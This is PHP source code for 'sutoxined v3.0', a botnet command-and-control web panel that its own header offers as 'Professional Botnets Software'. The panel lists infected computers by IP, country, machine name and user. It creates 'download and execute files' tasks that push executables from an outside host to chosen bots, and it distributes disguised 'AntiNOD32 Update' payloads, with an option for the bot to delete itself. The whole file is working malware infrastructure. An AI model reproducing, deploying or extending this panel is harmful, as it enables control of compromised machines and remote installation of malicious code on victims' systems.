<?
/*******************************************************
		__                                 
               /\ \__                __            
   ____  __  __\ \ ,_\   ___   __  _/\_\    ___    
  /',__\/\ \/\ \\ \ \/  / __`\/\ \/'\/\ \ /' _ `\  
 /\__, `\ \ \_\ \\ \ \_/\ \L\ \/>  </\ \ \/\ \/\ \ 
 \/\____/\ \____/ \ \__\ \____//\_/\_\\ \_\ \_\ \_\
  \/___/  \/___/   \/__/\/___/ \//\/_/ \/_/\/_/\/_/
	sutoxined v3.0 command & control center

	       by Cytech (malware@list.ru)
	      Professional Botnets Software

/*******************************************************/

include("config.php");			// conf

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$adm_login || $_SERVER['PHP_AUTH_PW']!==$adm_pass)
{
   header('WWW-Authenticate: Basic realm="sutoxin"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>access denied</b>");
}

?>
<head>
<title>:: sutoxined admin panel ::</title>
<style>
BODY, TD,input
      {
      background-color: #0B2219;
      scrollbar-face-color: #0B2219;
      scrollbar-shadow-color: #656B61;
      scrollbar-highlight-color: #767575;
      scrollbar-3dlight-color: #183A2C;
      scrollbar-darkshadow-color: #183A2C;
      scrollbar-track-color: #0E2D21;
      scrollbar-arrow-color: #FA8928;
      margin: 5pt;
      font-size: 8pt;
      font-family: Tahoma, Arial;
      color: #43896C;
      }
input 
	{
	border: 1px #d1dc97 dotted;
	color:#b45000;
	}	  
A:visited
      {
      color: #43896C;
      text-decoration: none;
      font-weight: bold;
      }
A:link
      {
      color: #43896C;
      text-decoration: none;
      font-weight: bold;
      }
A:hover
      {
      color: #FA8928;
      text-decoration: none;
      font-weight: bold;
      }
TEXTAREA
      {
      background-color: #0B2219;
      color:#64C39E;
      border: 1pt solid #0E2D21;
      font-size: 8pt;
      }
select 
	  {
      background-color: #0B2219;
      color:#64C39E;
      border: 1pt solid #0E2D21;
      font-size: 8pt;
	  }	  
</style>
</head>

<body><html>

<center>
<img src = "images/sutoxined.png"><br>
<small><b>sutoxined v3.0 by Cytech</b></small>
<br><br>
<a href = "?act=stats">[ STATISTICS ]</a>
<a href = "?act=tasks">[ TASKS CONTROL ]</a>
<a href = "?act=update">[ UPDATE CENTER ]</a>
<a href = "?act=bots">[ BOTS CONTROL ]</a>
<a href = "?act=help">[ SUTOXIN HELP ]</a>
</center>
<?

	/**********************************************************/
		Error_Reporting(0); // Error_Reporting(E_ALL & ~E_NOTICE);
	/**********************************************************/
		include("geoip.inc");		// geoip
		include("config.php");		// conf
		include("functions.php");	// functions
	/**********************************************************/
		$country_codes 		= 	$GLOBALS[GEOIP_COUNTRY_CODES];
		$country_names 		= 	$GLOBALS[GEOIP_COUNTRY_NAMES];
		$act			=	$_GET['act'];
	/**********************************************************/
		ConnectMySQL($db_host, $db_login, $db_password, $db_database);
	/**********************************************************/
	
// === [ stats mod ] === // 
if($act == "stats" || is_null($act))
{
	echo "\n\n<br><br><b>[ BOTNET STATISTICS ]</b><br><br>";

	$sql   = "SELECT COUNT(*) FROM botnet_bots";
	$bots_total = intval(mysql_result(mysql_query($sql), 0));

	$sql   = "SELECT COUNT(*) FROM botnet_bots WHERE ".time()."-`bot_time`<".(60*refresh_rate("get", null));
	$bots_online = intval(mysql_result(mysql_query($sql), 0));

	$sql = "SELECT COUNT(*) FROM botnet_bots WHERE ".time()."-`bot_time`<".(60*60);
	$bots_hour = intval(mysql_result(mysql_query($sql), 0));

	$sql = "SELECT COUNT(*) FROM botnet_bots WHERE ".time()."-`bot_time`<".(60*60*24);
	$bots_day = intval(mysql_result(mysql_query($sql), 0));
	
	echo    "\n<center><table style=\"text-align: center; width: 200px; height: 100px;\" border=\"0\"";
	echo	"cellpadding=\"0\"><tbody>";
		echo "\n<tr><td><b>ONLINE BOTS:</b></td><td>$bots_online</td></tr>";
		echo "\n<tr><td><b>HOUR BOTS:</b></td><td>$bots_hour</td></tr>";
		echo "\n<tr><td><b>DAY BOTS:</b></td><td>$bots_day</td></tr>";
		echo "\n<tr><td><b>TOTAL BOTS:</b></td><td>$bots_total</td></tr>";
	echo    "\n</table></center>";
	
	/**********************************************************/
	
	echo "\n\n<br><br><b>[ ONLINE COUNTRY STATISTICS ]</b><br><br>";
			echo	"\n<center>";
			echo    "\n<table style=\"text-align: center; width: 412px; height: 80px;\" border=\"1\"";
			echo	"cellpadding=\"0\"><tbody>";
			echo 	"\n<tr>";
			echo 	"\n<td> COUNTRY     </td>";
			echo 	"\n<td> ONLINE     </td>";
			echo 	"\n<td> TOTAL     </td>";
			echo 	"\n</tr>";

	for ($i = 0; $i < 247; $i++)
	{
		$sql = 	"SELECT COUNT(*) FROM botnet_bots WHERE ".time()."-`bot_time`<".
				(60*refresh_rate("get", null))." AND bot_country = '".$country_codes[$i]."'";
		$bots_online	=	intval(mysql_result(mysql_query($sql), 0));
		
		$sql = 	"SELECT COUNT(*) FROM botnet_bots WHERE bot_country = '".$country_codes[$i]."'";
		$bots_offline	=	intval(mysql_result(mysql_query($sql), 0));
		
		if($bots_online != 0 || $bots_offline != 0)
		{
			echo 	"\n<tr>";
			echo 	"\n<td>".ShowFlag($country_codes[$i])." $country_names[$i] ($country_codes[$i])</td>";
			echo 	"\n<td>$bots_online</td>";
			echo 	"\n<td>$bots_offline</td>";
			echo 	"\n</tr>";
		}
	}
			echo 	"\n</table>";
			echo	"\n</center>";
			
	/**********************************************************/
	
	echo "\n\n<br><br><b>[ REFRESH RATE ]</b><br><br>";
	echo 	"<form action=\"\" method=\"post\">";
	echo 	"minutes: <input name=\"rate\" size=\"10\" value=\"".refresh_rate("get", null)."\">";
	echo 	"\n<br><INPUT type=\"submit\" name=\"refresh_rate\" value=\"change rate\">";
	echo 	"\n</form>";
	
	if($_POST['refresh_rate'])
		refresh_rate("set", htmlspecialchars(addslashes($_POST['rate'])));

}
		
// === [ tasks mod ] === // 
if($act=="tasks")
{
	echo "\n\n<br><br><b>[ TASKS CONTROL CENTER ]</b><br><br>";

		$task 		= 	htmlspecialchars($_GET['task']);
		$task_id 	= 	addslashes($_GET['task_id']); 

	if($task)
	{
		if($task=="start")
			$sql 	=	"UPDATE botnet_tasks SET status='1' WHERE task_id = '$task_id'";
		else 
		if($task=="stop")
			$sql 	=	"UPDATE botnet_tasks SET status='0' WHERE task_id = '$task_id'";
		else 
		if($task=="kill")
			$sql 	=	"DELETE FROM botnet_tasks WHERE task_id = '$task_id'";
		else 
			die(MessageRedirect("unknown task action", $tasks_url));
		
		if(mysql_query($sql))
			MessageRedirect("status of task #$task_id is '$task' now", $tasks_url);
		else
			MessageRedirect("cant edit task #$task_id", $tasks_url);
	}

	$sql 	=	"SELECT * FROM botnet_tasks";
	$res 	= 	mysql_query($sql);
	if($res)
		$rows	=	mysql_num_rows($res);
	
	if($rows != 0)
	{
			echo    "\n<center>";
			echo    "\n<table style=\"text-align: center; width: 1000px; height: 80px;\" border=\"1\"";
			echo	"cellpadding=\"0\"><tbody>";
			echo 	"\n<tr>";
			echo 	"\n<td> TASK_ID    </td>";
			echo 	"\n<td> COMMAND    </td>";
			echo 	"\n<td> STATUS     </td>";
			echo 	"\n<td> EXECS      </td>";
			echo 	"\n<td> NEED EXECS </td>";
			echo 	"\n<td> BOTS 	   </td>";
			echo 	"\n<td> ACTION     </td>";
			echo	"\n</tr>";

			for ($i=0; $i < $rows; $i++)
			{
				 $row = mysql_fetch_assoc($res);
				 echo 	"\n<tr>";
				 echo 	"\n<td>#".$row['task_id']."</td>";
				 echo 	"\n<td>".CmdParser($row['command'])."</td>";
				 
				 if($row['status'] == 1)
					echo "\n<td><b> START </b></td>";
				 else
					echo "\n<td> STOP </td>";
					
				 echo 	"\n<td>".$row['execs']."</td>";
				 echo 	"\n<td>".$row['needexecs']."</td>";
				 echo 	"\n<td>".ShowFlag($row['bots'])." ".$row['bots']."</td>";
				 echo	"\n<td>";
				 echo	"\n<a href = \"?act=tasks&task_id=".$row['task_id']."&task=start\">+</a>";
				 echo	"\n<a href = \"?act=tasks&task_id=".$row['task_id']."&task=stop\">-</a>";
				 echo	"\n<a href = \"?act=tasks&task_id=".$row['task_id']."&task=kill\">~</a>";
				 echo 	"\n</td>";
				 echo	"\n</tr>";
			}
				
				echo 	"</tbody></table>";
				echo    "</center>";
	}
	else 
		echo "\n<b>there are no tasks in database</b>";
		
		/**********************************************************/
		
		 echo 	"\n\n<br><br><b>[ CREATE NEW TASK ]</b><br><br>";
		 echo 	"<form action=\"\" method=\"post\">";
		 echo 	"\nCOMMAND:";
		 echo 	"\n<SELECT name = \"command\">";
		 echo 	"\n<OPTION value = \"downandexec\">download and execute files</OPTION>";
		 echo 	"\n</SELECT>&nbsp;&nbsp;";
		 echo 	"<input type=\"checkbox\" name=\"delself\" value=1> delete self after command execution";
		 echo 	"\n<br>URLS:\n<br>";
		 echo 	"<textarea cols=\"100\" rows=\"3\" name=\"urls\" id=\"urls\">";
		 echo 	"http://havephun.org/1.exe;http://havephun.org/2.exe";
		 echo 	"</textarea>";
		 echo	"\n<br>EXECS:\n";
		 echo 	"<input name=\"execs\" size=\"10\" value=\"0\"> (0 for unlimited)";
		 echo 	"\n<br>BOTS:\n";
		 echo 	"\n<br><input type=\"radio\" name=\"by\" value=\"country\"> by country: "; 
		 echo 	"<SELECT name=\"bots\">"; 
		 echo 	"<OPTION value=ALL> All Bots (ALL) </OPTION>"; 

		 for ($i = 0; $i < 247; $i++)
		 {
			echo "\n<OPTION value=\"$country_codes[$i]\">$country_names[$i] ($country_codes[$i])</OPTION>"; 
		 }
		 
		 echo 	"\n</SELECT>";
		 echo 	"\n<br><input type=\"radio\" name=\"by\" value=\"uid\"> by bot uid: "; 
		 echo 	"<input name=\"bot_uid\" size=\"46\" value=";
		 
		 if(!$_GET['botuid'])
			echo	"\"84a7f08a33df1872174d2b235e68b443\"";
		 else
			echo	"\"".htmlspecialchars($_GET['botuid'])."\"";
		 echo	">&nbsp;&nbsp;";

		 echo 	"\n<br><INPUT type=\"submit\" name=\"create_task\" value=\"create task\">";
		 echo 	"\n</form>";
		 

		 if($_POST['create_task'] && $_POST['by'])
		 {
			$command	=	$_POST['command'];
			
			// === download & execute files === //
			if($command = "downandexec")
			{
				$urls		=	htmlspecialchars(addslashes($_POST['urls']));
				
				if($_POST['by']=="country")
					$bots	=	htmlspecialchars(addslashes($_POST['bots']));
				if($_POST['by']=="uid")
					$bots	=	"uid:".htmlspecialchars(addslashes($_POST['bot_uid']));
				
				$execs		=	htmlspecialchars(addslashes($_POST['execs']));
				$delself	=	$_POST['delself'];

				if(!$delself) 
					$delself = "0";
				else 		  
					$delself = "1";
				
			  $task_id 	 = 	time().rand(111111,999999);
			  $command 	 =  $cmd_prefix.$adelim.$task_id.$adelim.$exec_cmd.
							$adelim.$delself.$adelim.$urls.$cdelim;
			  
			  $sql = "INSERT INTO botnet_tasks (id, task_id, command, status, execs, needexecs, bots) ".
					 "VALUES ('', '$task_id', '$command', '1', '0', '$execs', '$bots')";
					 
			  if(mysql_query($sql))
				MessageRedirect("task #$task_id created successfully", $tasks_url);
			  else
				MessageRedirect("cant create task #$task_id", $tasks_url);

			}
		 }
		/**********************************************************/
}

// === [ update mod ] === // 
if($act=="update")
{
	/**********************************************************/
	echo "\n\n<br><br><b>[ UPDATES CONTROL CENTER ]</b><br><br>";
	$update		=	htmlspecialchars($_GET['update']);
	$update_id	=	htmlspecialchars(addslashes($_GET['update_id']));
	/**********************************************************/
		if($update)
		{
			if($update=="start")
			{
				StopOldUpdates();
				$sql 	=	"UPDATE botnet_updates SET status='1' WHERE update_id = '$update_id'";
			}
			else 
			if($update=="stop")
				$sql 	=	"UPDATE botnet_updates SET status='0' WHERE update_id = '$update_id'";
			else 
			if($update=="kill")
				$sql 	=	"DELETE FROM botnet_updates WHERE update_id = '$update_id'";
			else 
				die(MessageRedirect("unknown update action", $updates_url));
	
			if(mysql_query($sql))
				MessageRedirect("status of update #$update_id is '$update' now", $updates_url);
			else
				MessageRedirect("cant edit update #$update_id", $updates_url);
		}
	/**********************************************************/
	$sql 	=	"SELECT * FROM botnet_updates";
	$res 	= 	mysql_query($sql);
	if($res)
		$rows	=	mysql_num_rows($res);
	
	if($rows != 0)
	{
		echo    "\n<center>";
		echo    "\n<table style=\"text-align: center; width: 1000px; height: 80px;\" border=\"1\"";
		echo	"cellpadding=\"0\"><tbody>";
		echo 	"\n<tr>";
		echo 	"\n<td> UPDATE_ID  </td>";
		echo 	"\n<td> UPDATE_TASK</td>";
		echo 	"\n<td> STATUS     </td>";
		echo 	"\n<td> EXECS      </td>";
		echo 	"\n<td> COMMENT    </td>";
		echo 	"\n<td> ACTION     </td>";
		echo	"\n</tr>";
	
		for ($i = 0; $i < $rows; $i++)
		{
			 $row = mysql_fetch_assoc($res);
			 echo 	"\n<tr>";
			 echo 	"\n<td>#".$row['update_id']."</td>";
			 echo 	"\n<td>".UpdParser($row['url'])."</td>";
			 
			 if($row['status'] == 1) 
				echo "\n<td><b> START </b></td>";
			 else
				echo "\n<td> STOP </td>";
				
			 echo 	"\n<td>".$row['updated']."</td>";
			 echo 	"\n<td>".$row['version']."</td>";
			 echo	"\n<td>";
			 echo	"\n<a href = \"?act=update&update_id=".$row['update_id']."&update=start\">+</a>";
			 echo	"\n<a href = \"?act=update&update_id=".$row['update_id']."&update=stop\">-</a>";
			 echo	"\n<a href = \"?act=update&update_id=".$row['update_id']."&update=kill\">~</a>";
			 echo 	"\n</td>";
			 echo	"\n</tr>";
		}
			
		echo 	"</tbody></table>";
		echo    "</center>";

	}
	else
		echo "\n<b>there are no updates in database</b>";
			
	/**********************************************************/
	 echo 	"\n\n<br><br><b>[ CREATE NEW UPDATE & STOP OLD UPDATE TASKS ]</b><br><br>";
	 echo 	"<form action=\"\" method=\"post\">";
	 echo 	"\n<br>URL: ";
	 echo 	"<input name=\"url\" size=\"45\" value=\"http://havephun.org/antinod32_update.exe\">";
	 echo 	"\n<br>COMMENT: ";
	 echo 	"<input name=\"comment\" size=\"45\" value=\"AntiNOD32 Update, ".date("H:i:s d.m.Y")."\">";
	 echo 	"\n<br><INPUT type=\"submit\" name=\"create_update\" value=\"create update\">";
	 echo 	"\n</form>";
	/**********************************************************/
	 if($_POST['create_update'])
	 {
			$url		 =	htmlspecialchars(addslashes($_POST['url']));
			$ver		 =	htmlspecialchars(addslashes($_POST['comment']));
			$update_id 	 =  time().rand(111111,999999);
			
			$command 	 =  $upd_prefix.$adelim.$update_id.$adelim.$url.$cdelim;
			
			StopOldUpdates();
			
			$sql =  "INSERT INTO botnet_updates (id, update_id, url, status, updated, version) ".
					"VALUES ('', '$update_id', '$command', '1', '0', '$ver')";
					 
		  if(mysql_query($sql))
				MessageRedirect("update #$update_id created successfully", $updates_url);
		  else
				MessageRedirect("cant create update #$update_id", $updates_url);
	 }
	/**********************************************************/
}

// === [ bots mod ] === // 
if($act=="bots")
{
		// kill bot
		if($_GET['bot'] == "kill")
		{
			$bot_uid = htmlspecialchars(addslashes($_GET['botuid']));
			$sql = "DELETE FROM botnet_bots WHERE bot_uid='".$bot_uid."'";
			if(mysql_query($sql))
					MessageRedirect("bot #$bot_uid deleted from database successfully", $bots_url);
		}
		 
		 // bots page limit ;)
		 if($_POST['bots_page_limit'])
		 {
			$rate	=	htmlspecialchars(addslashes($_POST['limit']));
			bots_page_limit("set", $rate);
		 }
		 
		echo "\n\n<br><br><b>[ BOTS CONTROL CENTER ]</b><br><br>";

		 echo 	"\n<form action=\"\" method=\"get\">";
		 
		 // time select 
		 echo	"<input type=\"hidden\" name=\"act\" value=\"bots\">";
		 echo 	"\n<input type=\"radio\" name=\"status\" value=\"online\"> show only online bots"; 
		 echo 	"\n<input type=\"radio\" name=\"status\" value=\"total\"> show all online & offline bots";
		 echo 	"\n<input type=\"radio\" name=\"status\" value=\"offline\"> show only offline bots"; 
		
		// by country
		 echo 	"\n<br><input type=\"radio\" name=\"by\" value=\"country\"> by country: "; 
		 echo 	"\n<SELECT name=\"countries\">"; 
		 echo 	"<OPTION value=\"ALL\"> All Bots (ALL) </OPTION>"; 
		 for ($i = 1; $i < 247; $i++)
		 {
			echo "\n<OPTION value=\"$country_codes[$i]\">$country_names[$i] ($country_codes[$i])</OPTION>"; 
		 }
		 echo 	"\n</SELECT>";
		 echo 	"<br><INPUT type=\"submit\" name=\"show\" value=\"show\">";
		 echo 	"\n</form>";

		 // by uid
		 echo 	"\n<form action=\"\" method=\"get\">";
		 echo	"<input type=\"hidden\" name=\"act\" value=\"bots\">";
		 echo 	"\n<br>by bot uid:"; 
		 echo 	"\n<input name=\"bot_uid\" size=\"46\" value=";
 		 echo	"\"84a7f08a33df1872174d2b235e68b443\"";
		 echo	">&nbsp;&nbsp;";
		 echo 	"<INPUT type=\"submit\" name=\"show_bot_uid\" value=\"show\">";
		 echo 	"\n</form>";
		 
		 // by ip
		 echo 	"\n<form action=\"\" method=\"get\">";
		 echo	"<input type=\"hidden\" name=\"act\" value=\"bots\">";
		 echo 	"\n<br>by bot ip:"; 
		 echo 	"\n<input name=\"bot_ip\" size=\"46\" value=";
 		 echo	"\n".getenv("REMOTE_ADDR");
		 echo	">&nbsp;&nbsp;";
		 echo 	"<INPUT type=\"submit\" name=\"show_bot_ip\" value=\"show\">";
		 echo 	"\n</form>";
		 
		 // bots page limit form
		 $bots_page_limit	=	bots_page_limit("get", null);
		 echo 	"\n<form action=\"\" method=\"post\">";
		 echo 	"\n<br>bots on 1 page: <input name=\"limit\" size=\"10\" value=\"".$bots_page_limit."\">";
		 echo 	"\n<INPUT type=\"submit\" name=\"bots_page_limit\" value=\"change\">";
		 echo 	"\n</form>";
		 
	$sql	 	 = 	"SELECT * FROM botnet_bots";

	echo "<br><b>[ BOTNET TABLE ]</b><br><br>";

	if($_GET['by'] == "country" && $_GET['status'])
	{
			// countries
			if($_GET['countries'] !== "ALL")
			{
				$sql 	.=	" WHERE bot_country = '".addslashes($_GET['countries'])."'";
			}
			else
			if($_GET['countries'] !== "ALL" && $_GET['status'] !== "total")
			{
				$sql 	.=	" WHERE bot_country = '".addslashes($_POST['countries'])."'";
			}
			// status
			if($_GET['status'] && $_GET['status'] != "total")
			{
				if(strstr($sql, " WHERE ") == FALSE)
				{
					$sql .= " WHERE ";
				} 
				else
					$sql .= " AND ";

				if($_GET['status'] == "offline")
				{
					$sql 	.=	time()." - `bot_time` > ".(60*refresh_rate("get", null));
				}
				else
				if($_GET['status'] == "online")
				{
					$sql 	.=	time()." - `bot_time` < ".(60*refresh_rate("get", null));
				}
			}
	}
	else 
	if($_GET['show_bot_ip'])
	{
		$sql = "SELECT * FROM botnet_bots WHERE bot_ip = '".addslashes($_GET['bot_ip'])."'";
	}
	else
	if($_GET['show_bot_uid'])
	{
		$sql = "SELECT * FROM botnet_bots WHERE bot_uid = '".addslashes($_GET['bot_uid'])."'";
	}

		$sqlc 	 	 =	str_replace("*", "COUNT(*)", $sql); // count 

		$page	 =	 intval($_GET['page']);
		if ($page)
		{
			$lim = intval($page * $bots_page_limit);
			$sql.= " LIMIT $lim, $bots_page_limit"; 
		}
		else
			$sql.= " LIMIT 0, $bots_page_limit"; 

		$res 	= 	mysql_query($sql);
		$rows	=	mysql_num_rows($res);

	$res 	= 	mysql_query($sql);
	if($res)
		$rows	=	mysql_num_rows($res);
		
	if($rows != 0)
	{
			echo    "\n<center>";
			echo    "\n<table style=\"text-align: center; width: 912px; height: 80px;\" border=\"1\"";
			echo	"cellpadding=\"0\"><tbody>";
			echo 	"\n<tr>";
			echo 	"\n<td> UID      </td>";
			echo 	"\n<td> COPMUTERNAME@USER    </td>";
			echo 	"\n<td> IP      </td>";
			echo 	"\n<td> COUNTRY </td>";
			echo 	"\n<td> STATUS    </td>";
			echo 	"\n<td> ACTION     </td>";
			echo	"\n</tr>";

			for ($i = 0; $i < $rows; $i++)
			{
				 $row = mysql_fetch_assoc($res);
				 echo 	"\n<tr>";
				 echo 	"\n<td>".$row['bot_uid']."</td>";
				 echo 	"\n<td>".$row['bot_name']."</td>";
				 echo 	"\n<td>".$row['bot_ip']."</td>";
				 echo 	"\n<td>".ShowFlag($row['bot_country'])." ".$row['bot_country']."</td>";
				 
				 if(intval($row['bot_time']) > intval(time()-60*refresh_rate("get", null)))
				 {
					echo "\n<td><b>ONLINE</b></td>";
				 }
				 else
				 {
					echo 	"\n<td>\nlast date:\n".$row['bot_date']."</td>";
				 }
				 echo	"\n<td>";
				 echo	"\n<a href = \"?act=tasks&botuid=".$row['bot_uid']."\">#</a>";
				 echo	"\n<a href = \"?act=bots&botuid=".$row['bot_uid']."&bot=kill\">~</a>";
				 echo 	"\n</td>";
				 echo	"\n</tr>";
			}
				
				echo 	"</tbody></table>";
				echo    "</center>";

			$count_pages = 	mysql_result(mysql_query($sqlc),0);
			$count_pages =  intval($count_pages / $bots_page_limit);
			echo "<center><small>";
			
				$qstring = $_SERVER['QUERY_STRING'];
				$q_str = explode("&", $qstring);
				foreach($q_str as $q_str)
				{
					if(strstr($q_str, "page"))
						break;
					else
						$str .= htmlspecialchars($q_str)."&";
				}
				
			for($i = 0; $i < $count_pages+1; $i++)
			{
				echo "<a href = \"?".$str."page=$i\">[ $i ]</a> ";
			}
			echo "</center></small>";
		}
		else 
			echo "\n<b>there are no bots in database</b>";	

}
// ===[ mod help ]=== //
if($act=="help")
{
	echo "<pre>";
	$helpfile	=	"sutoxin.txt";
	$f = @fopen($helpfile, r);
	$r = @fread($f, filesize($helpfile));
	echo htmlspecialchars($r);
	echo "</pre>";
}
	/**********************************************************/
 ?>
</body></html>